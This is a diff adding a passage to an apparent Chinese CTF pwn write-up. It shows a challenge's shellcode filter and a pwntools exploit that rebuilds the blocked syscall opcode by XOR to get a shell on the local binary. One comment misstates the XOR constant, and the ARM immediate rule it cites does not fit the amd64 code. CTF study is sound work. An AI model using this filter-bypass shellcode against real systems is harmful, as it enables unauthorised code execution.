@@ -276,5 +276,77 @@ io.interactive()
 这道题不太会写，为什么呢？
 因为我不太会手写shellcode😰只会用shellcraft😋
 等我去学，学完回来写  
+```c
+int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
+{
+  int i; // [rsp+8h] [rbp-18h]
+  int v4; // [rsp+Ch] [rbp-14h]
+  void *buf; // [rsp+10h] [rbp-10h]
+  char *dest; // [rsp+18h] [rbp-8h]
+
+  init(argc, argv, envp);
+  label();
+  buf = mmap(0LL, 0x1000uLL, 3, 34, -1, 0LL);
+  dest = (char *)mmap(0LL, 0x1000uLL, 7, 34, -1, 0LL);
+  puts("Input your Code : ");
+  v4 = read(0, buf, 0x1000uLL);
+  for ( i = 0; i < v4 - 1; ++i )
+  {
+    if ( *((_BYTE *)buf + i) == 15 && *((_BYTE *)buf + i + 1) == 5
+      || *((_BYTE *)buf + i) == 15 && *((_BYTE *)buf + i + 1) == 52 )
+    {
+      puts("ERROR \\\\ Unavailable ! : syscall/sysenter/int 0x80");
+      exit(1);
+    }
+  }
+  strcpy(dest, (const char *)buf);
+  exec(dest);
+  exit(1);
+}
+```
+从反编译的代码中看到程序对输入的shellcode做了限制：不能够出现syscall;sysenter;int 0x80;<br>
+同时由于strcpy，shellcode中不能出现0x00，否则会导致shellcode被截断，不能完整的被copy到dest<br>
+思路：xor异或加密后在内存中解密
+```python
+from pwn import *
+
+context(arch='amd64', os='linux',log_level='debug')
+
+local = 1
+if local == 1:
+    io = process("./pwn")
+    gdb.attach(io, "b exec")
+else:
+    io = remote()
+
+shellcode = asm('''
+mov rsp,rdi; //之前rsp为0x0，现在给rsp一个正常地址，使得之后的execve传参能够实现
+mov rax,rdi; //这里是为了内存中搓syscall做准备
+mov rsi,rdi; //设置read函数参数
+add sp, 800; //随便将rsp设置到一个可以当作栈的位置
+mov dx, 0xffff; //设置read函数参数
+mov cx, 0x454f;
+xor cx, 0x4040; //0x454f xor 0x404a = 0x0f05，自此cx寄存器中存储了syscall机器码
+add rax, 0x40; //设置偏移
+mov [rax],cx; //将syscall放入内存中
+xor rdi,rdi; //设置read函数参数
+xor rax,rax;//read系统调用号 = 0
+''')
+shellcode = shellcode.ljust(0x40, asm('nop'))
+io.send(shellcode)
+shellcode2 = asm(shellcraft.sh())
+pause()
+io.send(b''.ljust(0x42, asm('nop')) + shellcode2)
+io.interactive()
+```
+踩过的坑：立即数设置要合法<br>
+《ARM体系结构与编程》一书中对立即数有这样的描述：每个立即数由一个8位的常数循环右移偶数位得到。
+一个32位的常数，只有能够通过上面构造方法得到的才是合法的立即数。
+之所以要特意设置rsp，是因为exec函数执行过程中，会将rsp，rbp等都设为0，即销毁堆栈<br>
+shellcode中最关键的是借助cx寄存器生成syscall的一段，其他部分都是为了正常执行代码所做的寄存器设置
+<br>
+其他做法：
+- 由于检测时只检测相邻两个字节是否为对应指令，所以我们可以分别使用add, mov等指令在内存中拼凑，而不使用异或（其实思路一样）
+- 可以不使用reread，而是直接尝试execve
 
 ## week3
